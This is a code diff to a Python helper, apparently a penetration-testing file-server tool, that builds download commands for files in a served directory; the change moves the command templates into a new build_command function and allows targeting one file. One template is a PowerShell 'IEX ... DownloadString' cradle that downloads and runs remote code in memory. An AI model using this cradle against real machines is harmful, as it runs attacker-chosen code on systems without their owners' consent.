@@ -14,7 +14,7 @@ def do(cmd):
 
 	if 'generate' in cmd:
 		if cmd.startswith('generate '):
-			cmd = cmd.split(' ')[1]
+			cmd = cmd.split(' ')[1:]
 			generate_command(cmd)
 
 	if 'read' in cmd:
@@ -47,18 +47,26 @@ def generate_command(cmd):
 	files = os.listdir(args.directory)
 	url = f'http://{args.server_address}:{args.server_port}/'
 	commands = []
-	for f in files:
-		if cmd == 'curl':
-			commands.append(f'curl {url}{f} --output {f}')
-		if cmd == 'wget':
-			commands.append(f'wget {url}{f}')
-		if cmd == 'Invoke-WebRequest':
-			commands.append(f'Invoke-WebRequest -Uri {url}{f} -OutFile {f}')
-		if cmd == 'DownloadString':
-			commands.append(f'powershell.exe -c IEX (New-Object Net.WebClient).DownloadString({url}{f})')
 
+	if len(cmd) == 1:
+		cmd = cmd[0]
+		for f in files:
+			commands.append(build_command(cmd, url, f))
+	elif len(cmd) == 2:
+		t = cmd[0]
+		f = cmd[1]
+		commands.append(build_command(t,url,f))
 	logger.list_commands(commands)
 
+def build_command(cmd, url, f):
+	if cmd == 'curl':
+		return f'curl {url}{f} --output {f}'
+	if cmd == 'wget':
+		return f'wget {url}{f}'
+	if cmd == 'Invoke-WebRequest':
+		return f'Invoke-WebRequest -Uri {url}{f} -OutFile {f}'
+	if cmd == 'DownloadString':
+		return f'powershell.exe -c IEX (New-Object Net.WebClient).DownloadString({url}{f})'
 
 def read_file(cmd):
 	if args.directory.endswith('/'):
